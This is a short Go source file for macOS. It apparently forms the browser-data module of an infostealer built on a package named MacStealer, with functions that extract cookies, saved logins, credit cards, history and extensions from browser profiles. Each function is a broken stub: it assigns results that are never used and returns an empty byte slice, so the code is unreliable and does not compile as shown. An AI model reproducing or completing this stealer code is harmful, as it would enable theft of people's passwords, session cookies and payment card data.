//go:build darwin

package main

import (
    "github.com/ultra-supara/MacStealer/browsingdata"
)

type DarwinBrowserDataExtractor struct{}

func (e *DarwinBrowserDataExtractor) ExtractCookies(path string) ([]byte, error) {
    cookies, err := browsingdata.GetCookie("", path)
    if err != nil {
        return nil, err
    }
    // Convert cookies to byte array for consistency
    return []byte{}, nil
}

func (e *DarwinBrowserDataExtractor) ExtractLoginData(path string) ([]byte, error) {
    loginData, err := browsingdata.GetLoginData("", path)
    if err != nil {
        return nil, err
    }
    // Convert login data to byte array for consistency
    return []byte{}, nil
}

func (e *DarwinBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, error) {
    creditCards, err := browsingdata.GetCreditCard("", path)
    if err != nil {
        return nil, err
    }
    // Convert credit cards to byte array for consistency
    return []byte{}, nil
}

func (e *DarwinBrowserDataExtractor) ExtractHistory(path string) ([]byte, error) {
    history, err := browsingdata.GetHistory(path)
    if err != nil {
        return nil, err
    }
    // Convert history to byte array for consistency
    return []byte{}, nil
}

func (e *DarwinBrowserDataExtractor) ExtractExtensions(path string) ([]byte, error) {
    extensions, err := browsingdata.GetExtension(path)
    if err != nil {
        return nil, err
    }
    // Convert extensions to byte array for consistency
    return []byte{}, nil
}
